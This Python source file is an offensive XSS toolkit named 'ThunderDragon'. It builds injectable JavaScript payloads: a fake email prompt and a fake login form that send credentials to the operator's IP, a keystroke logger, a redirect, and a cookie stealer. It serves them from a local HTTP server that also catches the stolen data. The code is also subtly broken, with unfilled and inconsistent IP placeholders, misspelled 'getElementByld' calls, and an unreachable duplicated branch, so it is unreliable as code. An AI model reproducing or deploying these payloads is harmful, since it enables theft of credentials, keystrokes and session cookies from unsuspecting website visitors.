# Made by: Airil / Ainhoa

from subprocess import call, check_output
import subprocess
import requests
import os
import signal
import sys

from other_functions import guardar_en_portapapeles

from termcolor import colored

DN = open(os.devnull, 'w')

http_server_process = None
def stop_http_server(signal, frame):
    global http_server_process
    if http_server_process is not None:
        http_server_process.terminate()
    sys.exit(0)

def indirect_xss_attacks(payload):
    script = str('<script src="http://{mi ip}/payload.js"></script>')
    guardar_en_portapapeles(script)
    print(str(colored("[+] Script copyed on the ", 'green') + colored("clipboard", 'cyan')))
    
    with open('payload.js', 'w') as file:
        file.write(payload)
        
        print(colored("[+] Payload created", 'green'))
        
        print(colored("[+] Starting payload hosting http server...", 'green'))
        print(colored("\n[-] CTRL+C TO STOP\n", 'yellow'))
        
        signal.signal(signal.SIGINT, stop_http_server)
        call(['python3', '-m', 'http.server', '80'])
        
        os.remove('payload.js')
        
        print(colored("[+] HTTP Server stoped and payload removed", 'green'))

def xss_scripts():
    ip_question = input(str(colored("\nThunderDragon", 'blue') + colored(" Local IP or Public IP [local/public] > ", 'red'))).strip().lower()
    if ip_question == "local":
        my_ip = check_output(['hostname', '-I']).strip().decode('utf-8')
    else:
        my_ip = requests.get('https://api.ipify.org').text
    
    print("my ip:", my_ip)
    
    attack_type = input(str(colored("\nThunderDragon", 'blue') + colored(" ATTACK TYPE [direct/indirect] > ", 'red'))).strip().lower()
    
    used, used1 = True, False
    
    while used != True or used1 != True:
        used1 = True
        script = input(str(colored("\nThunderDragon", 'blue') + colored(" SCRIPT (help for scripts list) > ", 'red'))).strip().lower()
        
        if script == "ask for creds":
            payload = '''    var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
    if (email == null || email == ""){
        alert("Es necesario introducir un correo válido para visualizar el post");
    } else {
        fetch("http://{my_ip}/?email=" + email)
    }'''
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<script>\n' + str(payload) + '\n</script>')
                guardar_en_portapapeles(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
        
        elif script == "ask for creds v2":
            payload = '''    var email;
	var password;
	var form = '<form>' +
		'Email: <input type="email" id="email" required>' +
		' Contraseña: <input type="password" id="password" required>' +
		'<input type="button" onclick="submitForm()" value="Submit">' +
		'</form>';

	document.getElementByld("formContainer").innerHTML = form;

	function submitForm() {
		email = document.getElementByld("email").value;
		password = document.getElementByld("password").value;
		fetch("http://{mi_ip}/?email=" + email + "&password=" + password);
	}'''
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<div id="formContainer"></div>' + '\n<script>\n' + str(payload) + '\n</script>')
                guardar_en_portapapeles(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
                
        elif script == "keyloger":
            payload = '''    var k = "";
	document.onkeypress = function(e){
		e = e || window.event;
		k += e.key;
		var i = new Image();
		i.src = "http://{mi_ip}/" + k;
	};'''
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<div id="formContainer"></div>' + '\n<script>\n' + str(payload) + '\n</script>')
                guardar_en_portapapeles(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
                
        elif script == "keyloger":
            web = input(str(colored("\nThunderDragon", 'blue') + colored(" DOMAIN > ", 'red'))).strip()
            payload = f'window.location.href = "https://{web}";'
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<div id="formContainer"></div>' + '\n<script>\n' + str(payload) + '\n</script>')
                guardar_en_portapapeles(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
                
        elif script == "cookie hijacking":
            payload = '''var request = new XMLHttpRequest();
request.open('GET', 'http://{mi_ip}/?cookie=' + document.cookie);
request.send();'''
        
            if attack_type == "direct" or attack_type == "d":
                script = str('<div id="formContainer"></div>' + '\n<script>\n' + str(payload) + '\n</script>')
                guardar_en_portapapeles(script)
                print(colored("[+] Script copyed on the pyperclip", 'green'))
                
            else:
                indirect_xss_attacks(payload)
            
        elif script == "help":
            print(str(colored(" SCRIPTS :", 'green', attrs=['dark', 'underline'])+
                      "\n · ask for creds"+
                      "\n · ask for creds v2"+
                      "\n · keyloger"+
                      "\n · redirect"+
                      "\n · cookie hijacking"))
            used1 = False
            
        else:
            used1 = False
    
    if attack_type == "direct":
        listening_question = input(str(colored("\nThunderDragon", 'blue') + colored(" START LISTENING [y/n] > ", 'red'))).strip().lower()
        
        if listening_question == "y" or listening_question == "yes":
            signal.signal(signal.SIGINT, stop_http_server)
            call(['python3', '-m', 'http.server', '80'])
